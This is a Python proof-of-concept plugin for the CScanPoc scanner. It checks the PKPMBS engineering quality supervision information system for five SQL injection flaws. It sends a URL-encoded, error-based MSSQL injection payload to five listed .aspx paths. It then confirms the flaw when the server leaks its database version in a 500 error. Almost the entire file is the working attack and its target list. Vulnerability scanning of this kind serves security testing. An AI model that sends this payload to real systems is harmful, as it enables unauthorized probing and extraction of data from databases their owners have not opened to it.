# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PKPMBS_0016'  # 平台漏洞编号，留空
    name = 'PKPMBS工程质量监督站信息管理系统5处SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-20'  # 漏洞公布时间
    desc = '''
        PKPMBS是一个多功能工程质量监督站信息管理系统。
        PKPMBS工程质量监督站信息管理系统5处SQL注入漏洞：
        "/pkpmbs/jdmanage/TJdZjyuanList.aspx",
        "/pkpmbs/portal/InfocontentList.aspx",
        "/pkpmbs/portal/InfoContentTreeList.aspx",
        "/pkpmbs/portal/YzgcList.aspx",
        "/pkpmbs/consmodel/TBpAreaList.aspx"
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121058'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PKPMBS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ac38f41f-233b-4e5b-995a-2878607a327c'
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                "/pkpmbs/jdmanage/TJdZjyuanList.aspx",
                "/pkpmbs/portal/InfocontentList.aspx",
                "/pkpmbs/portal/InfoContentTreeList.aspx",
                "/pkpmbs/portal/YzgcList.aspx",
                "/pkpmbs/consmodel/TBpAreaList.aspx"
            ]
            for p in ps:
                post = "keyword=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%20%29%29%20and%20%27%%27=%27&Submit3=%E6%90%9C%E3%80%80%E7%B4%A2"
                url = arg+p
                code, head, res, errcode, _ = hh.http(url, post)
                if code == 500 and "GAOJIMicrosoft" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
